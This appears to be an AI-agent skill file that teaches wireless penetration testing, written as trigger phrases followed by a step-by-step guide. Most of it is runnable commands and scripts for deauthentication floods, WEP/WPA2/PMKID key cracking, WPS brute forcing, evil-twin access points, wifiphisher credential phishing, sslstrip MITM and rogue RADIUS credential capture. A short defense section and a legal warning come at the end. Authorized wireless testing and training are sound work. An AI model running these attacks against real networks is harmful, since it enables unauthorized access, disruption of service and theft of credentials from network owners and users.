---
name: wireless-security-wifi-penetration-testing
description: Expert skill for wireless security testing and WiFi penetration testing using aircrack-ng, monitor mode, WEP/WPA/WPA2/WPA3 attacks, and rogue AP techniques
triggers:
  - "help me crack a WPA2 handshake"
  - "how do I capture WiFi handshakes with aircrack"
  - "set up monitor mode on my wireless adapter"
  - "perform a deauth attack on a wireless network"
  - "create an evil twin access point"
  - "crack WEP encryption with aircrack-ng"
  - "analyze wireless traffic with wireshark"
  - "set up a rogue access point for testing"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive wireless security testing capabilities using the aircrack-ng suite and related tools. It covers 802.11 reconnaissance, WEP/WPA/WPA2/WPA3 attacks, rogue access points, wireless MITM, and enterprise WiFi assessment.

## Overview

This project is a hands-on curriculum for wireless penetration testing that covers:

- **802.11 Fundamentals**: Standards, frame types, encryption protocols
- **Reconnaissance**: Hidden SSID discovery, traffic analysis, network enumeration
- **WEP Attacks**: Cracking, Chop-Chop, fragmentation, Caffe Latte
- **WPA/WPA2 Attacks**: Handshake capture, PMKID, dictionary/GPU cracking
- **WPA3 Attacks**: Dragonblood, downgrade attacks
- **Rogue APs**: Evil twin, captive portals, wireless MITM
- **Enterprise**: EAP/RADIUS assessment
- **Defense**: Detection, hardening, 802.11w

## Prerequisites

### Hardware Requirements

**Critical**: You need an injection-capable wireless adapter. Not all chipsets support monitor mode and packet injection.

**Recommended chipsets**:
- Atheros AR9271 (e.g., Alfa AWUS036NHA, TP-Link TL-WN722N v1)
- Ralink RT3070/RT5372 (e.g., Alfa AWUS036NH, Panda PAU05)

**DO NOT USE**:
- Built-in laptop WiFi (rarely supports injection)
- TP-Link TL-WN722N v2/v3 (different chipset, no injection)

### Software Requirements

**Base OS**: Kali Linux (pre-installed tools) or any Linux with packages below.

**Core tools**:
```bash
# Aircrack-ng suite (capture, injection, cracking)
sudo apt update
sudo apt install aircrack-ng

# Additional tools
sudo apt install \
  hashcat \
  hcxdumptool hcxtools \
  reaver bully wash \
  kismet \
  wireshark \
  hostapd dnsmasq \
  wifiphisher
```

## Initial Setup

### 1. Verify Adapter Capabilities

```bash
# Check if adapter is detected
sudo airmon-ng

# Expected output shows your wireless interface (e.g., wlan0)
# PHY     Interface       Driver          Chipset
# phy0    wlan0           ath9k_htc       Atheros Communications, Inc. AR9271

# Check for conflicting processes
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill
```

### 2. Enable Monitor Mode

```bash
# Start monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor interface created (wlan0mon or wlan0 in monitor mode)
sudo iwconfig

# wlan0mon should show Mode:Monitor
```

### 3. Test Packet Injection

```bash
# Test injection capability (-9 test mode, 00:11:22:33:44:55 is test MAC)
sudo aireplay-ng --test wlan0mon

# Successful output shows:
# Trying broadcast probe requests...
# Injection is working!
# Found X APs
```

If injection fails, your adapter/driver doesn't support it. Try a different adapter.

### 4. Set Regulatory Domain (Optional but Recommended)

```bash
# Check current regulatory domain
sudo iw reg get

# Set to your country (e.g., US for USA, GB for UK)
sudo iw reg set US

# Verify
sudo iw reg get
```

## Reconnaissance Techniques

### Basic Wireless Scanning

```bash
# Scan all channels, all encryption types
sudo airodump-ng wlan0mon

# Scan specific channel (e.g., channel 6)
sudo airodump-ng --channel 6 wlan0mon

# Scan 5GHz band (channels 36+)
sudo airodump-ng --band a wlan0mon

# Filter by encryption type (WPA2 only)
sudo airodump-ng --encrypt WPA2 wlan0mon

# Write captures to file
sudo airodump-ng -w capture --output-format pcap wlan0mon
```

**Key output columns**:
- `BSSID`: Access point MAC address
- `PWR`: Signal strength (higher = closer)
- `CH`: Channel number
- `ENC`: Encryption (OPN, WEP, WPA, WPA2, WPA3)
- `ESSID`: Network name (SSID)

### Target Specific Network

```bash
# Lock onto specific BSSID and channel
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w capture wlan0mon

# This is crucial before launching attacks - you need:
# 1. Exact BSSID
# 2. Correct channel
# 3. Capture file for handshakes
```

### Discover Hidden SSIDs

```bash
# Method 1: Wait for client connection (SSID in probe/association)
sudo airodump-ng --bssid <TARGET_BSSID> -c <CHANNEL> wlan0mon

# Method 2: Deauth client to force reconnection
# In separate terminal while airodump-ng runs:
sudo aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon

# SSID appears in airodump when client reconnects
```

### Advanced Reconnaissance with Kismet

```bash
# Start Kismet (web UI on http://localhost:2501)
sudo kismet

# Or headless with config
sudo kismet -c wlan0mon --override wardrive

# Kismet provides:
# - Device tracking across channels
# - Manufacturer identification (OUI lookup)
# - Wireless IDS alerts
# - Client relationship mapping
```

## WEP Attacks

**Note**: WEP is deprecated but still found on legacy devices.

### WEP Cracking with ARP Replay

```bash
# Terminal 1: Capture IVs (Initialization Vectors)
sudo airodump-ng --bssid <AP_BSSID> -c <CHANNEL> -w wep_capture wlan0mon

# Terminal 2: Fake authentication (required for injection)
sudo aireplay-ng --fakeauth 0 -a <AP_BSSID> -h <YOUR_ADAPTER_MAC> wlan0mon

# Terminal 3: ARP replay attack (generates traffic for IVs)
sudo aireplay-ng --arpreplay -b <AP_BSSID> -h <YOUR_ADAPTER_MAC> wlan0mon

# Wait for "Data packets" in airodump to reach ~20,000-50,000

# Terminal 4: Crack WEP key
sudo aircrack-ng wep_capture-01.cap

# Key appears as: KEY FOUND! [ XX:XX:XX:XX:XX ] (ASCII: password)
```

### WEP Chop-Chop Attack

```bash
# When ARP replay doesn't work (no clients, no traffic)
sudo aireplay-ng --chopchop -b <AP_BSSID> -h <YOUR_MAC> wlan0mon

# Creates a .cap and .xor file with decrypted packet

# Forge ARP packet from decrypted data
sudo packetforge-ng -0 -a <AP_BSSID> -h <YOUR_MAC> -k 255.255.255.255 \
  -l 255.255.255.255 -y replay_dec-*.xor -w forge.cap

# Replay forged packet
sudo aireplay-ng --interactive -r forge.cap wlan0mon

# Capture IVs and crack as above
```

## WPA/WPA2 Handshake Attacks

### Capture WPA2 Handshake

```bash
# Terminal 1: Start capture on target network
sudo airodump-ng --bssid <AP_BSSID> -c <CHANNEL> -w wpa_handshake wlan0mon

# Terminal 2: Deauthenticate a client to force handshake
# Wait until you see a client (STATION) in airodump, then:
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Alternative: Deauth all clients
sudo aireplay-ng --deauth 10 -a <AP_BSSID> wlan0mon

# Watch airodump-ng top-right for "WPA handshake: <BSSID>"
# Stop capture with Ctrl+C once handshake captured
```

### Crack Handshake with Aircrack-ng (CPU)

```bash
# Using wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_handshake-01.cap

# Using multiple wordlists
sudo aircrack-ng -w wordlist1.txt,wordlist2.txt wpa_handshake-01.cap

# Specify BSSID if multiple networks in capture
sudo aircrack-ng -b <AP_BSSID> -w rockyou.txt wpa_handshake-01.cap

# Successful crack shows:
# KEY FOUND! [ password123 ]
```

### Crack Handshake with Hashcat (GPU)

```bash
# Convert .cap to hashcat format
sudo aircrack-ng wpa_handshake-01.cap -J wpa_handshake

# This creates wpa_handshake.hccapx (or .22000 for newer hashcat)

# Or use hcxpcapngtool for modern format
hcxpcapngtool -o wpa_handshake.22000 wpa_handshake-01.cap

# Crack with hashcat (mode 22000 for WPA/WPA2)
hashcat -m 22000 -a 0 wpa_handshake.22000 /usr/share/wordlists/rockyou.txt

# With rules for mutations
hashcat -m 22000 -a 0 wpa_handshake.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 22000 wpa_handshake.22000 --show
```

### PMKID Attack (Clientless WPA2)

```bash
# Capture PMKID (no client deauth needed)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Wait for PMKID to be captured (appears in status)
# Ctrl+C to stop

# Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack PMKID
hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt

# PMKID is often faster than handshake capture
```

## Deauthentication Attacks

### Basic Deauth

```bash
# Deauth specific client (10 packets)
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Continuous deauth (0 = infinite)
sudo aireplay-ng --deauth 0 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Broadcast deauth (all clients)
sudo aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
```

### MDK4 for Advanced DoS

```bash
# Install MDK4
sudo apt install mdk4

# Beacon flood (creates fake APs)
sudo mdk4 wlan0mon b -f fake_ssids.txt -a -s 1000

# Deauth flood (more aggressive than aireplay)
sudo mdk4 wlan0mon d -c <CHANNEL> -b <AP_BSSID>

# Authentication DoS
sudo mdk4 wlan0mon a -a <AP_BSSID> -i <CLIENT_MAC>
```

## Rogue Access Point Attacks

### Evil Twin with Airbase-ng

```bash
# Create fake AP with same ESSID as target
sudo airbase-ng -e "TargetNetwork" -c <CHANNEL> wlan0mon

# With specific BSSID spoofing
sudo airbase-ng -e "TargetNetwork" -a <TARGET_BSSID> -c <CHANNEL> wlan0mon

# Airbase creates at0 interface - bridge to internet
sudo ifconfig at0 up
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0
```

### Evil Twin with Hostapd + DNSmasq

```bash
# Create hostapd config
cat > evil_twin.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd
sudo hostapd evil_twin.conf

# In separate terminal, configure DHCP
sudo dnsmasq -C dnsmasq.conf -d

# dnsmasq.conf:
# interface=wlan0mon
# dhcp-range=192.168.1.10,192.168.1.100,12h
# dhcp-option=3,192.168.1.1
# dhcp-option=6,192.168.1.1
```

### Automated Evil Twin with Wifiphisher

```bash
# Install wifiphisher
sudo apt install wifiphisher

# Automatic evil twin with captive portal
sudo wifiphisher -aI wlan0mon -e "TargetNetwork" -p firmware-upgrade

# Available phishing scenarios:
# - firmware-upgrade (fake router update)
# - oauth-login (fake Google/Facebook login)
# - browser-plugin-update
# - wifi_connect (WPA password harvest)

# Captured credentials saved to wifiphisher.log
```

### Wireless MITM with Bettercap

```bash
# Install bettercap
sudo apt install bettercap

# Start bettercap on rogue AP interface
sudo bettercap -iface at0

# Interactive commands:
# net.probe on
# set arp.spoof.targets 192.168.1.0/24
# arp.spoof on
# net.sniff on
# set http.proxy.sslstrip true
# http.proxy on

# Captures credentials, cookies, HTTP traffic
```

## WPS Attacks

### WPS PIN Brute Force with Reaver

```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Look for "WPS Locked: No" in output

# Attack with Reaver (can take hours)
sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -vv

# With delay to avoid lockout
sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -vv -d 5 -T 0.5 -r 3:15

# Options:
# -d 5: 5 second delay between attempts
# -T 0.5: timeout for each attempt
# -r 3:15: sleep 15 seconds after 3 failures
```

### Pixie Dust Attack with Reaver

```bash
# Faster attack exploiting weak random number generation
sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -K -vv

# -K enables Pixie Dust attack
# Success rate depends on router model/firmware
```

## WPA3 Attacks

### Dragonblood (CVE-2019-13377)

```bash
# Install dragonslayer toolkit
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test for Dragonblood vulnerability
sudo ./dragonslayer.py wlan0mon <CHANNEL> <AP_BSSID> <ESSID>

# If vulnerable, performs downgrade to WPA2
# Then capture handshake and crack normally
```

### WPA3 Downgrade Attack

```bash
# Use hostapd-wpe for WPA3 testing
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
make

# Configure hostapd-wpe to force WPA2 transition mode
# Then capture handshake as normal WPA2 attack
```

## Enterprise WiFi (EAP/RADIUS) Testing

### Capture EAP Handshake

```bash
# Capture enterprise WiFi traffic
sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> -w eap_capture wlan0mon

# Deauth to force EAP re-authentication
sudo aireplay-ng --deauth 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Look for EAPOL frames in capture
```

### Rogue RADIUS Server with Hostapd-WPE

```bash
# Install hostapd-wpe
sudo apt install hostapd-wpe

# Configure enterprise evil twin
cat > hostapd-wpe.conf << 'EOF'
interface=wlan0mon
ssid=CorporateWiFi
channel=6
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dhparam.pem
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
EOF

# Start rogue RADIUS
sudo hostapd-wpe hostapd-wpe.conf

# Captured credentials in /var/log/hostapd-wpe/
# Look for MSCHAP challenge/response for cracking
```

### Crack EAP Credentials

```bash
# Extract MSCHAP from hostapd-wpe log
grep "mschap:" /var/log/hostapd-wpe/hostapd-wpe.log > mschap.txt

# Convert to hashcat format
# Format: username:::challenge:response

# Crack with hashcat (mode 5500 for NTLMv1)
hashcat -m 5500 -a 0 mschap.txt rockyou.txt
```

## Traffic Analysis

### Wireshark for 802.11

```bash
# Open capture in Wireshark
wireshark capture-01.cap

# Key filters:
# wlan.fc.type_subtype == 0x08  (Beacon frames)
# wlan.fc.type_subtype == 0x00  (Association request)
# wlan.fc.type_subtype == 0x0c  (Deauthentication)
# eapol                         (WPA handshake frames)
# wlan.addr == <MAC>            (Traffic to/from MAC)

# Decrypt WPA2 traffic (if you have PSK)
# Edit → Preferences → Protocols → IEEE 802.11
# Enable decryption, add key: wpa-psk or wpa-pwd
# Format: <PSK_HEX> or password:SSID
```

### Extract Files from Decrypted Traffic

```bash
# After decrypting in Wireshark
# File → Export Objects → HTTP/SMB/TFTP

# Or use tshark
tshark -r capture.cap -Y http -T fields -e http.file_data | xxd -r -p > extracted.bin
```

## Defense and Detection

### Detect Rogue APs

```bash
# Continuous monitoring with Kismet
sudo kismet -c wlan0mon

# Look for:
# - Duplicate SSIDs with different BSSIDs
# - Weak signal APs with strong client association
# - Known BSSIDs on wrong channels

# Or use airodump with known BSSID whitelist
sudo airodump-ng wlan0mon | grep -v "<KNOWN_BSSID1>\|<KNOWN_BSSID2>"
```

### Enable 802.11w (Management Frame Protection)

```bash
# On hostapd-based AP, add to config:
# ieee80211w=2  # Required
# wpa_key_mgmt=WPA-PSK-SHA256

# This prevents deauth attacks on supporting clients
```

### Wireless IDS with Kismet

```bash
# Kismet alerts on:
# - Deauthentication floods
# - Beacon floods
# - Rogue APs
# - WEP usage
# - Weak encryption

# Check alerts
kismet_client -h localhost -p 2501

# Or review kismet logs
tail -f ~/.kismet/logs/Kismet-*.kismet
```

## Common Patterns

### Full WPA2 Capture and Crack Workflow

```bash
#!/bin/bash
TARGET_BSSID="00:11:22:33:44:55"
TARGET_CHANNEL="6"
TARGET_ESSID="TargetNetwork"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# 1. Enable monitor mode
sudo airmon-ng start wlan0
sleep 2

# 2. Start capture
sudo airodump-ng --bssid $TARGET_BSSID -c $TARGET_CHANNEL -w capture wlan0mon &
AIRODUMP_PID=$!

# 3. Wait for client, then deauth
echo "Waiting 10 seconds for clients..."
sleep 10
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID wlan0mon

# 4. Wait for handshake
echo "Capturing handshake (30 seconds)..."
sleep 30
sudo kill $AIRODUMP_PID

# 5. Verify handshake
if sudo aircrack-ng capture-01.cap | grep -q "1 handshake"; then
    echo "Handshake captured!"
    
    # 6. Crack
    sudo aircrack-ng -w $WORDLIST -b $TARGET_BSSID capture-01.cap
else
    echo "No handshake captured. Retry."
fi

# 7. Cleanup
sudo airmon-ng stop wlan0mon
```

### Automated Evil Twin for Credential Harvesting

```bash
#!/bin/bash
TARGET_SSID="CorporateWiFi"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL="6"

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Deauth legitimate AP to push clients to evil twin
sudo aireplay-ng --deauth 0 -a $TARGET_BSSID wlan0mon &
DEAUTH_PID=$!

# Start evil twin with credential phishing
sudo wifiphisher -aI wlan0mon -e "$TARGET_SSID" -p wifi_connect -nE

# Credentials saved to wifiphisher.log
# Ctrl+C to stop, then:
kill $DEAUTH_PID
sudo airmon-ng stop wlan0mon
```

## Troubleshooting

### Monitor Mode Won't Start

```bash
# Check for conflicts
sudo airmon-ng check
sudo airmon-ng check kill

# Manually kill problematic processes
sudo killall NetworkManager wpa_supplicant dhclient

# Restart network services after testing
sudo systemctl restart NetworkManager
```

### Injection Test Fails

```bash
# Verify chipset
lsusb | grep -i wireless
# Should show Atheros, Ralink, or other supported chipset

# Update drivers
sudo apt update
sudo apt install firmware-atheros firmware-ralink

# Test different channels
for ch in 1 6 11; do
    sudo iwconfig wlan0mon channel $ch
    sudo aireplay-ng --test wlan0mon
done
```

### No Handshake Captured

```bash
# Ensure client is connected (STATION shows in airodump)
# If no clients, wait or use PMKID attack instead

# Increase deauth packets
sudo aireplay-ng --deauth 50 -a <AP_BSSID> wlan0mon

# Target specific client
sudo aireplay-ng --deauth 20 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Check capture for handshake manually
sudo aircrack-ng capture-01.cap
# Look for "1 handshake" message
```

### WPA Cracking is Slow

```bash
# Use GPU with hashcat instead of CPU aircrack
hashcat -m 22000 -a 0 -w 3 capture.22000 rockyou.txt --force

# -w 3: High workload (uses more GPU)
# --force: Ignore warnings on non-optimal hardware

# Check hashcat speed
hashcat -m 22000 -b

# Optimize wordlist (remove duplicates)
sort -u rockyou.txt -o rockyou_unique.txt
```

### Rogue AP Not Attracting Clients

```bash
# Ensure stronger signal than legitimate AP
# - Move closer to target clients
# - Use external antenna
# - Increase TX power (within legal limits)
sudo iw wlan0mon set txpower fixed 2000  # 20 dBm

# Spoof legitimate BSSID exactly
sudo macchanger -m <TARGET_BSSID> wlan0mon

# Continuously deauth legitimate AP
sudo aireplay-ng --deauth 0 -a <LEGIT_BSSID> wlan0mon &

# Use same channel and SSID
```

### Airodump Shows No Networks

```bash
# Check interface is in monitor mode
sudo iwconfig wlan0mon
# Should show Mode:Monitor

# Scan all bands
sudo airodump-ng --band abg wlan0mon

# Check regulatory domain allows scanning
sudo iw reg get
sudo iw reg set US  # or your country code

# Verify antenna is connected properly
```

## Environment Variables

```bash
# Set interface names
export WLAN_IFACE="wlan0"
export WLAN_MON="wlan0mon"

# Default wordlists
export WORDLIST_SMALL="/usr/share/wordlists/fasttrack.txt"
export WORDLIST_LARGE="/usr/share/wordlists/rockyou.txt"

# Capture directory
export CAPTURE_DIR="$HOME/wifi_captures"
mkdir -p $CAPTURE_DIR

# Use in scripts
sudo airodump-ng -w $CAPTURE_DIR/capture $WLAN_MON
```

## Best Practices

1. **Always get written authorization** before testing wireless networks
2. **Isolate your lab** - use low TX power and RF-shielded environments
3. **Verify chipset** before purchasing adapters - not all WiFi cards support injection
4. **Take snapshots** of VMs before each attack phase for easy rollback
5. **Document findings** - keep logs of successful attacks for reporting
6. **Test defenses** - after each attack, configure and test mitigations (802.11w, WPA3, strong PSKs)
7. **Use bare metal** for timing-sensitive attacks (WEP Chop-Chop, fragmentation)
8. **Monitor spectrum** - use Kismet to understand the RF environment before attacking
9. **Rotate attack vectors** - if one method fails (handshake), try another (PMKID, WPS)
10. **Clean up** - stop monitor mode and restart NetworkManager when done

## Legal Warning

All techniques in this skill are for **authorized testing only**. Wireless attacks against networks you don't own or lack explicit written permission to test are illegal under:

- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws globally

Practice only on:
- Your own isolated lab equipment
- CTF/training ranges
- Client networks with signed authorization

Deauthentication, jamming, and rogue APs disrupt service and can affect neighboring networks - use minimum necessary power and duration.
